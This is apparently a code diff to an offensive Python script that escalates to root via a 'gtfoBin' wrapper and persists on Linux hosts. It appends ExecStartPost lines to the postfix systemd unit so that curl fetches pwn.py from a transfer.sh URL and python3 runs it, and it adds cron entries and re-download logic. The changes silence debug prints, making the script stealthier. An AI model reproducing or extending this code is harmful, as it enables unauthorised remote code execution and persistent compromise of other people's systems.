@@ -100,7 +100,7 @@ def update_python():
         runCommand(pyth)
         return
     except Exception:
-        print('updating python')
+        #print('updating python')
         runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))
 
 def rerun():
@@ -110,7 +110,6 @@ def rerun():
 
 def is_root():
     if os.getuid() == 0:
-        print("OBTAINED ROOT")
         return True
     else:
         # Rerun This Script As Root User
@@ -118,7 +117,7 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/l6137d/pwn.py\n".format(locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/LwlNfC/pwn.py\n".format(locationFile)
     ourPwnShit2 = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
     ourPwnShitRemove = "ExecStartPost=/usr/bin/bash rm -f {}\n".format(locationFile)
     try:
@@ -136,7 +135,8 @@ def startUpRecovery():
                 service.writelines(line)
         
     except:
-        print("Failed To Append to File ", path)    
+        #print("Failed To Append to File ", path)    
+        exit()
     
     runCommand("rm -f {}".format(files[0]))
 
@@ -166,10 +166,10 @@ def appendCron(path, command):
                 cron.close()
             runCommand("systemctl reload crond.service")
             runCommand("systemctl restart crond.service")
-            print('Appended To File ', path)
+            #print('Appended To File ', path)
 
     except:
-        print('bruh. couldnt cook in this kitchen')
+        #print('bruh. couldnt cook in this kitchen')
         exit()
 
 
@@ -220,7 +220,7 @@ def getScript():
             '''
                 Implement Directory to Save These Files To
             '''
-        print("redownloaded script")
+        #print("redownloaded script")
     else:
         exit()
 
